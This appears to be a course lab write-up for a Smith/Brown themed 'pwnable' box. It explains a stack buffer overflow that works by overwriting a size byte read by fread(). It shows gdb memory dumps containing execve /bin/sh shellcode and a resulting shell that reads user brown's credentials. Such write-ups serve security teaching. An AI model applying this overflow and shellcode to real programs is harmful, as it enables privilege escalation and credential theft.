@@ -1,0 +1,54 @@
+In this question, the vulnerability we wish to exploit is found in the fread() function call on line 15. This function reads in a specified number of bytes from a stream (file) into an array referred to by the pointer (msg). Thus, our exploit takes advantage of the fact that the address of the size variable is known; we can overwrite it with a large number, which will then allow us to insert a large string into the buffer (which contains the shell code as well).
+
+We first began by setting a breakpoint on line 12 (where the size is set). Since the output of our script was placed into a FILE stream (line 11), we set the first byte of our script output as our size (“0xff” - 255). In addition, we also see at this breakpoint that the address of the buffer is much above the address of the EBP (and therefore the RIP).
+
+
+(gdb) p &size
+$7 = (int8_t *) 0xbffffbb7 "\377"
+(gdb) p $ebp
+$9 = (void *) 0xbffffc48
+(gdb) p &msg
+$10 = (char (*)[128]) 0xbffffbb8
+
+
+Next, we set another breakpoint at line 15 (before the buffer is filled) and determined what must go in the rest of our buffer. To account for the space between the start of the buffer and the EBP, we will insert 148 bytes of random text (“\xff”), resulting in our EBP being overwritten. We then will insert our forged return address (which refers to our shell code) into the RIP spot, and finally insert our shell code 4 bytes after the RIP.
+
+Here is what our buffer looks like at line 15 (Note: same EBP and &msg as above).
+
+
+(gdb) x/50x msg
+0xbffffbb8:	0x00000000	0x00000000	0x00000000	0x00000000
+...		...		...		...		...
+0xbffffc48:	0xbffffc68	0x0804857b	0xbffffdff	0x00000000
+0xbffffc58:	0x08048599	0xb7fd2000	0x08048590	0x00000000
+0xbffffc68:	0x00000000	0xb7e454d3	0x00000002	0xbffffd04
+0xbffffc78:	0xbffffd10	0xb7fdc858
+
+
+Thus, if we set a breakpoint at line 16 (right after the buffer is filled) we see that our shell code’s address has been set to the RIP and see our shell code right after.
+
+
+(gdb) p $ebp
+$16 = (void *) 0xbffffc48
+(gdb) x/50x msg
+0xbffffbb8:	0xffffffff	0xffffffff	0xffffffff	0xffffffff
+...		...		...		...		...
+0xbffffc48:	0xffffffff	0xbffffc50	0x895e1feb	0xc0310876
+0xbffffc58:	0x89074688	0x0bb00c46	0x4e8df389	0x0c568d08
+0xbffffc68:	0xdb3180cd	0xcd40d889	0xffdce880	0x622fffff
+0xbffffc78:	0x732f6e69	0xb7fd0a68
+
+
+Thus, after puts() is called and our display function tries to return, our shell code is executed, and we obtain the account info for Agent Brown.
+
+
+smith@pwnable:~$ invoke ./exploit
+���������������������������������������������������������������������������������������������������������������������������������
+$ whoami
+brown
+$ cat README
+Never send a human to do a machine's job.
+
+user: brown
+pass: Zsps7Z):
+
